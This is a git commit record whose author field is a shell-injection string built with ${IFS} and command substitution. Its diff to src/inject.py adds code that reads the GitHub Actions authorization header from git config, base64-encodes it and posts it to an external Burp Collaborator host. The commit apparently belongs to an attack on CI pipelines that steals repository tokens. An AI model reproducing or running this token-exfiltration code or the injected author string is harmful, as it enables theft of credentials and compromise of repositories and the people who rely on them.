9d97348ed1480313ed4264b3d7b0f8f333f6f6fd
stp-$('&&${IFS}echo${IFS}${IFS}&&echo${IFS}fullname&&${IFS}echo${IFS}') <76434077+d3kum1d0r1y4@users.noreply.github.com>
2023-08-09 02:50:52 -0400

    Update inject.py

--- src/inject.py
+++ src/inject.py
@@ -1,12 +1,26 @@
 import subprocess
 import base64
-import time
+import requests
+
 # Run the command and capture its output
 try:
     output = subprocess.check_output(["git", "config", "--get", "http.https://github.com/.extraheader"], text=True)
     encoded_output = base64.b64encode(output.encode()).decode()  # Base64 encode and decode as string
-    print(encoded_output)
-    time.sleep(300)
-#
+    
+    # Define the endpoint URL
+    endpoint_url = "https://y0zie7crqh78gnyci17i0yi2ut0soh.burpcollaborator.net/collab"
+
+    # Define the payload
+    payload = {
+        "data": encoded_output
+    }
+
+    # Send the POST request
+    response = requests.post(endpoint_url, json=payload)
+
+    if response.status_code == 200:
+        print("Data sent successfully.")
+    else:
+        print("Failed to send data. Status code:", response.status_code)
 except subprocess.CalledProcessError as e:
     print("Error:", e)
